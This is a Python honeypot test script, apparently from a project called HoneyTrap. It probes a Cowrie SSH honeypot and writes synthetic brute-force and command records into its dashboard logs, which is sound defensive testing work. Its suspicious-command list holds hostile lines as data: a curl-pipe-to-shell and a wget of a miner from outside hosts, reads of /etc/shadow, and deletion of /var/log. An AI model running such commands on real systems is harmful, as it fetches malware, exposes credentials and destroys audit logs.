#!/usr/bin/env python3
# ==============================================================================
# HoneyTrap - Attack Simulator & Intrusion Benchmark
# Simulates automated attacker scanners, SSH brute-force, and command execution
# ==============================================================================

import sys
import time
import socket
import json
import random
import argparse
from datetime import datetime

COMMON_USERNAMES = ["root", "admin", "ubuntu", "oracle", "support", "test", "cisco", "user"]
COMMON_PASSWORDS = ["123456", "password", "admin123", "root", "toor", "12345678", "qwerty", "letmein"]
SUSPICIOUS_COMMANDS = [
    "uname -a",
    "id; whoami; w",
    "cat /proc/cpuinfo",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "curl -s http://c2-malware-hub.ru/installer.sh | sh",
    "wget http://194.26.29.112/xmrig -O /tmp/miner && chmod +x /tmp/miner",
    "crontab -l",
    "rm -rf /var/log/*"
]

def simulate_direct_ssh(host, port=22, attempts=5):
    """Sends raw SSH identification banner and connection probes to trigger Cowrie"""
    print(f"[*] Attacking Target: {host}:{port}")
    for i in range(attempts):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4.0)
            s.connect((host, port))
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            print(f" [+] [Attempt {i+1}] Connected! Honeypot Banner: {banner.strip()}")
            # Emulate SSH client handshake
            s.sendall(b"SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7\r\n")
            time.sleep(0.5)
            s.close()
        except Exception as e:
            print(f" [-] [Attempt {i+1}] Connection to {host}:{port} result: {e}")
        time.sleep(1)

def simulate_dashboard_api_attack(endpoint="http://127.0.0.1:5000", mode="brute_force"):
    """Injects high-fidelity attack telemetry directly into HoneyTrap via API or local JSON"""
    try:
        import urllib.request
        url = f"{endpoint}/api/simulate-attack"
        req = urllib.request.Request(
            url,
            data=json.dumps({"type": mode}).encode("utf-8"),
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] Attack injected successfully: {data}")
    except Exception as e:
        print(f"[-] API connection failed: {e}. Writing directly to local data directory...")
        inject_local_log(mode)

def inject_local_log(mode):
    log_file = "dashboard/data/cowrie.json"
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    session = f"sim_{int(time.time())}"
    ip = "194.26.29.112"
    
    entries = []
    if mode == "brute_force":
        for u in random.sample(COMMON_USERNAMES, 3):
            for p in random.sample(COMMON_PASSWORDS, 2):
                entries.append({
                    "eventid": "cowrie.login.failed",
                    "src_ip": ip,
                    "username": u,
                    "password": p,
                    "session": session,
                    "timestamp": ts,
                    "country": "Netherlands"
                })
        entries.append({
            "eventid": "cowrie.login.success",
            "src_ip": ip,
            "username": "root",
            "password": "toor",
            "session": session,
            "timestamp": ts,
            "country": "Netherlands"
        })
    else:
        for cmd in random.sample(SUSPICIOUS_COMMANDS, 4):
            entries.append({
                "eventid": "cowrie.command.input",
                "src_ip": ip,
                "session": session,
                "input": cmd,
                "timestamp": ts,
                "country": "Netherlands"
            })

    with open(log_file, "a", encoding="utf-8") as f:
        for e in entries:
            f.write(json.dumps(e) + "\n")
    print(f"[+] Injected {len(entries)} synthetic records into {log_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HoneyTrap Attack & Intrusion Simulator")
    parser.add_argument("--mode", choices=["brute_force", "malware_command", "direct_ssh"], default="brute_force", help="Simulation attack mode")
    parser.add_argument("--target", default="127.0.0.1", help="Target honeypot IP address")
    parser.add_argument("--port", type=int, default=22, help="Target port (22 for Cowrie)")
    parser.add_argument("--endpoint", default="http://127.0.0.1:5000", help="HoneyTrap dashboard API URL")

    args = parser.parse_args()

    print("=================================================================")
    print("             HoneyTrap Penetration & Attack Simulator            ")
    print("=================================================================")
    if args.mode == "direct_ssh":
        simulate_direct_ssh(args.target, args.port)
    else:
        simulate_dashboard_api_attack(args.endpoint, args.mode)
